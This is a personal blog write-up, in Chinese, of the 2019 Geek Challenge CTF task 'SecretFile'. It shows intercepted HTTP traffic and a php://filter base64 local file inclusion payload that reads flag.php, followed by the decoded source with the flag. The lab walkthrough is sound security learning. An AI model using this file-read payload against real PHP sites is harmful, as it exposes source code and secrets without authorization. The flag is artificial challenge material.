# 2019 极客大挑战 SecretFile



误入了一下代码审计。。。主要是我还做出来第一步了，所以有很大兴趣继续做下去。

用开发者工具可以很容易看到被调成黑色与背景融为一体的`you find me`(大概这样)，其实也可以直接看到`Archive_room.php`这个文件名。

进去以后点点secret然后没有什么收获。

再来一次页面代码就很无聊了，所以排除再次ctrl&#43;shift&#43;I。

抓包试试，

  

&lt;!-- more --&gt;

  

**Request**

```

GET /action.php HTTP/1.1

Host: 3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0

Accept: text/html,application/xhtml&#43;xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh,zh-TW;q=0.8,zh-HK;q=0.6,en-US;q=0.4,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://3b51e313-5282-4581-a4c7-2d3152b688a3.node4.buuoj.cn:81/Archive_room.php

Upgrade-Insecure-Requests: 1

```

  

**Response**

```

HTTP/1.1 302 Found

Server: openresty

Date: Wed, 13 Sep 2023 12:25:16 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

Location: end.php

X-Powered-By: PHP/7.3.11

Content-Length: 63

  

&lt;!DOCTYPE html&gt;

  

&lt;html&gt;

&lt;!--

   secr3t.php        

--&gt;

&lt;/html&gt;

```

可以看到一个被注释了的php文件。进入该文件中，出现了一堆页面代码，不够有提示一个`flag.php`，所以我们又顺着进去看看，nothing。

然后翻翻wp，说是&lt;u&gt;**filter伪协议**&lt;/u&gt;。

所以构造`https://xxx/ser3t.php?file=php://filter/convert.base64-encode/resource=flag.php`，进去之后下面那一串堪比乱码的字符如此显眼，加之我们构造的URL里面有个非常明显的base64，解码一下就是含有flag的页面代码。

  

```txt

PCFET0NUWVBFIGh0bWw&#43;Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI&#43;CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI&#43;PGJyPjxicj48YnI&#43;PGJyPjxicj48YnI&#43;CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO&#43;8geS9oOaJvuWIsOaIkeS6hu&#43;8geWPr&#43;aYr&#43;S9oOeci&#43;S4jeWIsOaIkVFBUX5&#43;fjwvaDE&#43;PGJyPjxicj48YnI&#43;CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L&#43;Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7Y2Q0MmNhNjUtYmNjNy00YjJiLWI0ZGQtYzYxNGZjZTBjMDI3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8&#43;CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=

```

  

base64解码之后：

  

```html

&lt;!DOCTYPE html&gt;

  

&lt;html&gt;

  

    &lt;head&gt;

        &lt;meta charset=&#34;utf-8&#34;&gt;

        &lt;title&gt;FLAG&lt;/title&gt;

    &lt;/head&gt;

  

    &lt;body style=&#34;background-color:black;&#34;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;

        &lt;h1 style=&#34;font-family:verdana;color:red;text-align:center;&#34;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;

        &lt;p style=&#34;font-family:arial;color:red;font-size:20px;text-align:center;&#34;&gt;

            &lt;?php

                echo &#34;我就在这里&#34;;

                $flag = &#39;flag{cd42ca65-bcc7-4b2b-b4dd-c614fce0c027}&#39;;

                $secret = &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;

            ?&gt;

        &lt;/p&gt;

    &lt;/body&gt;

  

&lt;/html&gt;

  

```

  

就是这样子的效果，据说这叫代码审计。

  

----

  

&lt;a href=https://blog.csdn.net/gental_z/article/details/122303393&gt;filter伪协议&lt;/a&gt;

&lt;a href=https://www.cnblogs.com/linuxsec/articles/12684259.html&gt;一些filter伪协议技巧&lt;/a&gt;

&lt;hr&gt;

2023补充，是SSRF之file协议读取文件。

---

> Author:   
> URL: https://66lueflam144.github.io/posts/2849be8/  

